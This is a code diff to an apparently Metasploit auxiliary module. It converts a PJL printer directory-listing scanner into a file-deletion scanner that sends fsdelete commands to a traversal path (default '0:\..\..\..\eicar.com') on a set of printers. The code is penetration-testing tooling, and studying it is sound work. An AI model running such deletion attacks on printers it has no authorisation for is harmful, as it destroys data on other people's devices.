@@ -14,9 +14,9 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      "Name" => "Printer Directory Listing Scanner",
+      "Name" => "Printer File Deletion Scanner",
       "Description" => %q{
-        This module lists a directory on a set of printers using the
+        This module deletes a file on a set of printers using the
         Printer Job Language (PJL) protocol.
       },
       "Author" => [
@@ -34,7 +34,7 @@ class Metasploit4 < Msf::Auxiliary
 
     register_options([
       Opt::RPORT(Rex::Proto::PJL::DEFAULT_PORT),
-      OptString.new("PATH", [true, "Remote path", '0:\..\..\..'])
+      OptString.new("PATH", [true, "Remote path", '0:\..\..\..\eicar.com'])
     ], self.class)
   end
 
@@ -46,21 +46,13 @@ class Metasploit4 < Msf::Auxiliary
     pjl.begin_job
 
     pjl.fsinit(path[0..1])
-    listing = pjl.fsdirlist(path)
+
+    if pjl.fsdelete(path)
+      print_good("#{ip}:#{rport} - Deleted #{path}")
+    end
 
     pjl.end_job
     disconnect
-
-    if listing
-      print_good("#{ip}:#{rport} - #{listing}")
-      report_note(
-        :host => ip,
-        :port => rport,
-        :proto => "tcp",
-        :type => "printer.dir.listing",
-        :data => listing
-      )
-    end
   end
 
 end
